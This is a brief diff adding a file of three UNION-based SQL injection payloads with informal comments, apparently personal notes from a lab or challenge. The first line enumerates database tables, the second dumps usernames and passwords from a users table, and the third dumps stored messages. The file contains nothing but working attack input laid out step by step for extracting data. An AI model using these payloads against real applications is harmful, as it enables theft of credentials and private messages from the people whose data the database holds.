@@ -1,0 +1,3 @@
+1: 12 union select 1,group_concat(table_name),3,4 from information_schema.tables where table_schema = database()
+2: 12 union select 1,group_concat(username,password),3,4 from users   // select what u see in Data //
+3: 12 union select 1,group_concat(message_content),3,4 from messages    //  after u put what u want //
